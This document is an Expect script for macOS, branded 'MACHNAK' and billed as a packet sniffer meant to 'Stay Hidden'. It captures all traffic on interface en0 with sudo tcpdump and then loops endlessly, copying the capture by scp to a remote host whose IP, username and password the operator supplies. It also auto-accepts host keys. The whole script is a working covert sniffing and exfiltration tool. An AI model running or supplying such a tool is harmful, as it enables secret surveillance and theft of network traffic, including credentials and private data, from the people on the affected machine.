#!/usr/bin/expect

send_user "\n"
send_user "  ███╗   ███╗ █████╗  ██████╗██╗  ██╗███╗   ██╗ █████╗ ██╗  ██╗\n"
send_user "  ████╗ ████║██╔══██╗██╔════╝██║  ██║████╗  ██║██╔══██╗██║ ██╔╝\n"
send_user "  ██╔████╔██║███████║██║     ███████║██╔██╗ ██║███████║█████╔╝ \n"
send_user "  ██║╚██╔╝██║██╔══██║██║     ██╔══██║██║╚██╗██║██╔══██║██╔═██╗ \n"
send_user "  ██║ ╚═╝ ██║██║  ██║╚██████╗██║  ██║██║ ╚████║██║  ██║██║  ██╗\n"
send_user "  ╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝\n"
send_user "\n"
send_user "           Packet Sniffer & MACOS Analyzer - Stay Hidden!\n"
send_user "\n"

# Set timeout
set timeout 60
set file_path "$env(HOME)/Desktop/machnak.pcap"  ; # Use user's home directory for the file

# Function to prompt for input and validate it
proc get_input {prompt} {
    send_user "$prompt"
    expect_user -re "(.*)\n"
    return $expect_out(1,string)
}

# Get the IP address from the user
set ip [get_input "\[+]\ Enter IP address for the foreign host: "]
if {$ip eq ""} {
    send_user "\[-]\ Error: IP address cannot be empty!\n"
    exit 1
}

# Get the username from the user
set username [get_input "\[+]\ Enter username for the foreign host: "]
if {$username eq ""} {
    send_user "\[-]\ Error: Username cannot be empty!\n"
    exit 1
}

# Get the password from the user (hidden input)
stty -echo
set password [get_input "\[+]\ Enter password for the foreign host: "]
stty echo
send_user "\n"  ; # Move to a new line after input

# Validate password input
if {$password eq ""} {
    send_user "\[-]\ Error: Password not provided!\n"
    exit 1
}

# Step 1: Create an empty .pcap file in the user's home directory
send_user "\[+]\ Creating an empty pcap file at $file_path\n"
exec touch $file_path

send_user "\[+]\ Starting packet capture... Saving to $file_path\n"
spawn sudo tcpdump -i en0 -s 0 -w $file_path
send_user "\[+]\ Packet capture is now running in the background...\n"
send_user "\[+]\ Starting file transfer...\n"

# Step 3: SCP file transfer loop every 5 seconds
while {1} {
    send_user "\[+]\ Attempting packets transfer...\n"
    spawn scp $file_path $username@$ip:/home/$username/Desktop
    expect {
        "Are you sure you want to continue connecting?" {
            send "yes\r"
            exp_continue
        }
        "password:" {
            send "$password\r"
            expect eof
        }
        timeout {
            send_user "\[-]\ Error: Timeout reached! Please try again.\n"
        }
        eof
    }
    
    # Wait 4 seconds before retrying
    sleep 4
}







